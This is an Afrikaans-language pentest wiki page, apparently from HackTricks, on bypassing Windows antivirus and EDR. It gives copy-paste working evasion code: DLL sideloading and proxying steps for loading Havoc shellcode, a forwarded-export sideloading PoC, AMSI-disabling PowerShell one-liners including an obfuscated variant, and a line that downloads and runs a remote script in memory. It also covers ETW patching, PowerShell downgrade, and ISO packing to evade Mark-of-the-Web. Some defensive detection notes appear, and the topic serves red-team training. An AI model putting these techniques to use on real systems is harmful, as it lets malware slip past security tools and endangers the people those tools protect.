# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): ’n hulpmiddel om Windows Defender te laat ophou werk.
- [no-defender](https://github.com/es3n1n/no-defender): ’n hulpmiddel om Windows Defender te laat ophou werk deur as ’n ander AV voor te gee.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Tans gebruik AV’s verskillende metodes om te kontroleer of ’n lêer kwaadwillig is of nie: static detection, dynamic analysis, en vir die meer gevorderde EDRs, behavioural analysis.

### **Static detection**

Static detection word bereik deur bekende kwaadwillige strings of byte-reekse in ’n binary of script te merk, en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke tools jou makliker kan laat vang, aangesien hulle waarskynlik al ontleed en as kwaadwillig gemerk is. Daar is ’n paar maniere om hierdie soort deteksie te omseil:

- **Encryption**

As jy die binary enkripteer, sal daar geen manier wees vir AV om jou program te detect nie, maar jy sal ’n soort loader nodig hê om die program in geheue te dekodeer en te laat loop.

- **Obfuscation**

Soms hoef jy net ’n paar strings in jou binary of script te verander om dit verby AV te kry, maar dit kan ’n tydrowende taak wees afhangend van wat jy probeer obfuskeer.

- **Custom tooling**

As jy jou eie tools ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit neem baie tyd en moeite.

> [!TIP]
> ’n Goeie manier om teen Windows Defender se static detection te toets is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit splits die lêer in verskeie segmente en laat Defender elkeen individueel scan; op hierdie manier kan dit jou presies vertel watter strings of bytes in jou binary gemerk word.

Ek beveel sterk aan dat jy hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion bekyk.

### **Dynamic analysis**

Dynamic analysis is wanneer die AV jou binary in ’n sandbox laat loop en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou browser se wagwoorde te dekodeer en te lees, ’n minidump van LSASS te maak, ens.). Hierdie deel kan ’n bietjie moeilik wees om mee te werk, maar hier is ’n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit ’n goeie manier wees om AV se dynamic analysis te omseil. AV’s het baie min tyd om lêers te scan om nie die gebruiker se werkvloei te onderbreek nie, so die gebruik van lang sleeps kan die analise van binaries ontwrig. Die probleem is dat baie AV sandboxes net die sleep kan oorskiet afhangend van hoe dit geïmplementeer is.
- **Checking machine's resources** Gewoonlik het Sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien kan vertraag. Jy kan hier ook baie kreatief wees, byvoorbeeld deur die CPU se temperatuur of selfs die waaierspoed na te gaan; nie alles sal in die sandbox geïmplementeer wees nie.
- **Machine-specific checks** As jy ’n gebruiker wil teiken wie se werkstasie by die "contoso.local" domain ingeskryf is, kan jy ’n check op die rekenaar se domain doen om te sien of dit by die een pas wat jy gespesifiseer het; as dit nie pas nie, kan jy jou program laat afsluit.

Dit blyk dat Microsoft Defender se Sandbox computername HAL9TH is, dus kan jy vir die computer name in jou malware kyk voordat dit detoneer; as die naam HAL9TH is, beteken dit jy is binne defender se sandbox, en jy kan jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog ’n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir die stryd teen Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanaal</p></figcaption></figure>

Soos ons vroeër in hierdie pos gesê het, sal **publieke tools** uiteindelik **gedetekteer word**, dus moet jy jouself ’n vraag vra:

Byvoorbeeld, as jy LSASS wil dump, **het jy regtig mimikatz nodig**? Of kan jy ’n ander projek gebruik wat minder bekend is en ook LSASS dump?

Die regte antwoord is waarskynlik die laasgenoemde. Neem mimikatz as voorbeeld: dit is waarskynlik een van, indien nie die mees gemerkte stuk malware deur AVs en EDRs nie; terwyl die projek self baie cool is, is dit ook ’n nagmerrie om dit te gebruik om AV’s te omseil, so kyk net vir alternatiewe vir wat jy probeer bereik.

> [!TIP]
> As jy jou payloads wysig vir evasion, maak seker jy skakel die outomatiese sample submission in defender af, en asseblief, ernstig, **DO NOT UPLOAD TO VIRUSTOTAL** as jou doel is om doodloopvlak-evasië te bereik. As jy wil toets of jou payload deur ’n spesifieke AV gedetekteer word, installeer dit op ’n VM, probeer om die outomatiese sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Wanneer dit moontlik is, prioritiseer altyd die gebruik van DLLs vir evasion; uit my ervaring word DLL-lêers gewoonlik baie minder gedetekteer en ontleed, so dit is ’n baie eenvoudige truuk om in sekere gevalle deteksie te vermy (as jou payload natuurlik ’n manier het om as ’n DLL te loop).

Soos ons in hierdie beeld kan sien, het ’n DLL Payload van Havoc ’n detection rate van 4/26 in antiscan.me, terwyl die EXE payload ’n 7/26 detection rate het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me vergelyking van ’n normale Havoc EXE payload teenoor ’n normale Havoc DLL</p></figcaption></figure>

Nou sal ons ’n paar truuks wys wat jy met DLL-lêers kan gebruik om baie meer stealthy te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** maak voordeel van die DLL search order wat deur die loader gebruik word deur beide die slagoffertoepassing en kwaadwillige payload(s) langs mekaar te posisioneer.

Jy kan vir programme kyk wat vatbaar is vir DLL Sideloading deur [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell script te gebruik:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag sal die lys van programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL-lêers wat hulle probeer laai, vertoon.

Ek beveel sterk aan dat jy **DLL Hijackable/Sideloadable programs self ondersoek**; hierdie tegniek kan redelik onopvallend wees as dit behoorlik uitgevoer word, maar as jy algemeen bekende DLL Sideloadable programs gebruik, kan jy maklik gevang word.

Net deur 'n kwaadwillige DLL met die naam wat 'n program verwag om te laai te plaas, sal nie noodwendig jou payload laai nie, aangesien die program sekere spesifieke funksies binne daardie DLL verwag. Om hierdie probleem op te los, sal ons 'n ander tegniek gebruik wat **DLL Proxying/Forwarding** genoem word.

**DLL Proxying** stuur die oproepe wat 'n program maak vanaf die proxy (en kwaadwillige) DLL na die oorspronklike DLL deur, en behou sodoende die program se funksionaliteit terwyl dit die uitvoering van jou payload kan hanteer.

Ek sal die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal ons 2 lêers gee: 'n DLL-bronkode-sjabloon, en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 Detection rate in [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek beveel **sterk aan** dat jy [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer te leer oor wat ons meer in diepte bespreek het.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules kan funksies export wat eintlik "forwarders" is: in plaas daarvan om na code te wys, bevat die export entry 'n ASCII string van die vorm `TargetDll.TargetFunc`. Wanneer 'n caller die export resolve, sal die Windows loader:

- Laai `TargetDll` indien dit nog nie gelaai is nie
- Resolve `TargetFunc` daaruit

Belangrike gedrag om te verstaan:
- As `TargetDll` 'n KnownDLL is, word dit verskaf vanaf die beskermde KnownDLLs namespace (bv., ntdll, kernelbase, ole32).
- As `TargetDll` nie 'n KnownDLL is nie, word die normale DLL-soekorde gebruik, wat die gids van die module wat die forward resolution doen insluit.

Dit maak 'n indirekte sideloading primitive moontlik: vind 'n signed DLL wat 'n funksie export wat forwarded is na 'n nie-KnownDLL module naam, en ko-lokaliseer daardie signed DLL saam met 'n attacker-controlled DLL wat presies die naam van die forwarded target module het. Wanneer die forwarded export aangeroep word, los die loader die forward op en laai jou DLL vanaf dieselfde gids, en voer jou DllMain uit.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, dus word dit opgelos volgens die normale soekorde.

PoC (copy-paste):
1) Kopieer die gesigneerde stelsel DLL na 'n skryfbare gids
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n minimale `DllMain` is genoeg om code execution te kry; jy hoef nie die forwarded function te implementeer om `DllMain` te trigger nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Veroorsaak die forwarding met 'n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (onderteken) laai die side-by-side `keyiso.dll` (onderteken)
- Terwyl dit `KeyIsoSetAuditingInterface` oplos, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers 'n "missing API" fout nadat `DllMain` reeds uitgevoer is

Hunting tips:
- Fokus op forwarded exports waar die teikenmodule nie 'n KnownDLL is nie. KnownDLLs word gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports opsom met gereedskap soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder-inventaris om kandidaten te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporing/verdediging-idees:
- Moniteer LOLBins (bv. rundll32.exe) wat gesigneerde DLLs vanaf nie-stelselpaadjies laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam uit daardie gids
- Waarsku op proses-/modulekettings soos: `rundll32.exe` → nie-stelsel `keyiso.dll` → `NCRYPTPROV.dll` onder gebruikersskryfbare paadjies
- Dwing code-integriteitsbeleid af (WDAC/AppLocker) en weier write+execute in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op 'n onopvallende wyse te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ontduiking is net 'n kat-en-muis-speletjie — wat vandag werk kan môre opgespoor word, so vertrou nooit net op een hulpmiddel nie; as dit moontlik is, probeer om verskeie ontwijkingstegnieke te ketting.

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AVs slegs **files on disk** deursoek, so as jy op een of ander manier payloads **directly in-memory** kon uitvoer, kon die AV niks doen om dit te keer nie, aangesien dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in die volgende komponente van Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Dit stel antivirus-oplossings in staat om skripgedrag te inspekteer deur skripinhoud in 'n vorm bloot te stel wat beide onversleuteld en nie-geobfuskuleer is nie.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let op hoe dit `amsi:` voorvoeg en dan die pad na die uitvoerbare lêer vanwaar die skrip geloop het — in hierdie geval, powershell.exe.

Ons het geen lêer op skyf geplaas nie, maar is steeds in-memory gevang weens AMSI.

Verder, te begin met **.NET 4.8**, word C#-kode ook deur AMSI geloop. Dit raak selfs `Assembly.Load(byte[])` wat in-memory uitvoering laai. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of laer) te gebruik vir in-memory uitvoering as jy AMSI wil ontduik.

Daar is 'n paar maniere om rondom AMSI te kom:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese detections werk, kan dit 'n goeie manier wees om die skripte wat jy probeer laai te wysig om opsporing te ontduik.

Egter, AMSI het die vermoë om skripte te de-obfuskeer, selfs as daar meerdere lae is, so obfuscation kan 'n slegte opsie wees, afhangend van hoe dit gedoen word. Dit maak dit nie so eenvoudig om te ontduik nie. Soms hoef jy egter net 'n paar veranderlike name te verander en jy is goed, so dit hang af van hoeveel iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell-proses (ook cscript.exe, wscript.exe, ens.) te laai, is dit moontlik om dit maklik te manipuleer, selfs wanneer jy as 'n ongeprivilegieerde gebruiker loop. As gevolg van hierdie wanimplementering van AMSI het navorsers verskeie maniere gevind om AMSI-scanning te ontduik.

**Forcing an Error**

Om die AMSI-initialisering te dwing om te misluk (amsiInitFailed) sal tot gevolg hê dat geen skandering vir die huidige proses geïnisieer word nie. Oorspronklik is dit deur [Matt Graeber](https://twitter.com/mattifestation) openbaar gemaak en Microsoft het 'n signature ontwikkel om wyer gebruik te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Dit het net een reël powershell-kode geneem om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gemerk, dus is 'n aanpassing nodig om hierdie tegniek te kan gebruik.

Hier is 'n aangepaste AMSI bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik gemerk sal word sodra hierdie plasing uitkom, dus behoort jy nie enige kode te publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Please read [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) for a more detailed explanation.

Daar is ook baie ander tegnieke wat gebruik word om AMSI met PowerShell te bypass — kyk na [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) en [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) om meer daaroor te leer.

Hierdie tool [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) genereer ook 'n script om AMSI te bypass.

**Verwyder die gedetekte handtekening**

Jy kan 'n tool soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekte AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie tool werk deur die geheue van die huidige proses te skandeer vir die AMSI-handtekening en dit dan te oor skryf met NOP-instruksies, wat dit effektief uit die geheue verwyder.

**AV/EDR products that uses AMSI**

Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik vind in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is 'n funksie wat jou toelaat om alle PowerShell-opdragte wat op 'n stelsel uitgevoer word, te log. Dit kan nuttig wees vir ouditering en foutopsporing, maar dit kan ook 'n **probleem wees vir aanvallers wat ontdekking wil ontduik**.

Om PowerShell-logging te omseil, kan jy die volgende tegnieke gebruik:

- **Disable PowerShell Transcription and Module Logging**: Jy kan 'n hulpmiddel soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, so jy kan jou skripte uitvoer sonder dat AMSI dit gaan skandeer. Jy kan dit doen: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n powershell sonder verdediging te spawn (dit is wat `powerpick` van Cobal Strike gebruik).


## Obfuscation

> [!TIP]
> Verskeie obfuscation-tegnieke berus op die enkriptering van data, wat die entropie van die binêre sal verhoog en dit vir AVs en EDRs makliker sal maak om dit te detect. Wees versigtig hiermee en oorweeg om enkripsie slegs op spesifieke afdelings van jou kode toe te pas wat sensitief is of versteek moet word.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae te tref wat decompilers en sandboxes blokkeer. Die onderstaande werkvloei **herstel betroubaar 'n byna oorspronklike IL** wat daarna na C# gedecompileer kan word in gereedskap soos dnSpy of ILSpy.

1.  Anti-tampering removal – ConfuserEx enkripteer elke *method body* en ontsleutel dit binne die *module* static constructor (`<Module>.cctor`). Dit pas ook die PE checksum aan sodat enige wysiging die binêre sal laat crash. Gebruik **AntiTamperKiller** om die geënkripteerde metadata-tabelle te lokaliseer, die XOR-sleutels te herstel en 'n skoon assembly te herskryf:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die uitset bevat die 6 anti-tamper-parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Symbol / control-flow recovery – voer die *clean* lêer in by **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, klasse en veranderlike name herstel en konstante stringe ontsleutel.

3.  Proxy-call stripping – ConfuserEx vervang direkte method calls met liggewig wrappers (a.k.a *proxy calls*) om verdere dekompilasie te saboteer. Verwyder dit met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondeursigtige wrapper-funksies (`Class8.smethod_10`, …).

4.  Manual clean-up – voer die resultaat-binaire in dnSpy uit, soek na groot Base64-blobs of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *werklike* payload te lokaliseer. Dikwels stoor die malware dit as 'n TLV-geënkodeerde byte-array wat binne `<Module>.byte_0` geïnisialiseer is.

Bovengenoemde ketting herstel die uitvoeringstroom **sonder** om die kwaadwillige monster te hoef uit te voer – nuttig wanneer jy op 'n offline werksstasie werk.

> 🛈  ConfuserEx produseer 'n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as 'n IOC gebruik kan word om monsters outomaties te triage.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): The aim of this project is to provide an open-source fork of the [LLVM](http://www.llvm.org/) compilation suite able to provide increased software security through [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) and tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om, by compile time, obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik en sonder om die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag obfuscated operations by wat gegenereer word deur die C++ template metaprogramming framework en wat die lewe van iemand wat die toepassing wil kraak 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat verskeie verskillende PE files kan obfuskeer, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitraire executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fijnkorrelige code obfuscation framework vir LLVM-supported languages wat ROP (return-oriented programming) gebruik. ROPfuscator obfuskeer 'n program op die assembly code vlak deur gewone instruksies in ROP chains te transformeer, en so ons natuurlike begrip van normale control flow te verhinder.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL omskakel na shellcode en dit daarna laai

## SmartScreen & MoTW

Jy het moontlik hierdie skerm gesien wanneer jy sekere executables vanaf die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoering van moontlik kwaadaardige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met 'n reputation-based benadering, wat beteken dat ongereeld afgelaaide toepassings SmartScreen sal aktiveer en so die eindgebruiker waarsku en verhinder om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers vanaf die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om op te let dat uitvoerbare lêers wat met 'n **vertroude** signing certificate onderteken is **nie SmartScreen sal aktiveer nie**.

'n Baie effektiewe manier om te voorkom dat jou payloads die Mark of The Web kry, is om dit in 'n soort houer soos 'n ISO in te pak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** toe toegepas kan word op **non NTFS** volumes nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat payloads in output containers verpak om Mark-of-the-Web te ontwijk.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is 'n demo om SmartScreen te omseil deur payloads binne ISO-lêers te verpakk met behulp van [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige logmechanisme in Windows wat toepassings en stelselkomponente toelaat om **gebeurtenisse te loog**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en te vind.

Soos hoe AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`** funksie van die userspace-proses onmiddellik te laat terugkeer sonder om enige gebeurtenisse te loog. Dit word gedoen deur die funksie in geheue te patch sodat dit onmiddellik terugkeer, wat effektief ETW-logging vir daardie proses deaktiveer.

Jy kan meer inligting vind by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Om C# binaries in geheue te laai is al 'n geruime tyd bekend en dit is steeds 'n uitstekende manier om jou post-exploitation tools te laat loop sonder om deur AV opgemerk te word.

Aangesien die payload direk in geheue gelaai sal word sonder om die skyf te raak, hoef ons slegs bekommerd te wees oor die patching van AMSI vir die hele proses.

Die meeste C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, ens.) bied reeds die vermoë om C# assemblies direk in geheue uit te voer, maar daar is verskillende maniere om dit te doen:

- **Fork\&Run**

Dit behels die **skep van 'n nuwe offerproses**, die inspuiting van jou post-exploitation kwaadwillige kode in daardie nuwe proses, die uitvoering van jou kwaadwillige kode en wanneer dit klaar is, die beëindiging van die nuwe proses. Dit het sowel voordele as nadele. Die voordeel van die fork-and-run metode is dat uitvoering plaasvind **buite** ons Beacon implant-proses. Dit beteken dat as iets in ons post-exploitation aksie verkeerd loop of gevang word, daar 'n **veel groter kans** is dat ons **implant oorleef.** Die nadeel is dat jy 'n **groter kans** het om deur **Behavioural Detections** gevang te word.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dit gaan oor die inspuiting van die post-exploitation kwaadwillige kode **in sy eie proses**. Op hierdie manier kan jy vermy om 'n nuwe proses te skep wat deur AV gescan word, maar die nadeel is dat as iets verkeerd gaan met die uitvoering van jou payload, daar 'n **veel groter kans** is dat jy jou **beacon verloor** aangesien dit kan crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> As jy meer wil lees oor C# Assembly loading, kyk asseblief na hierdie artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) en hul InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

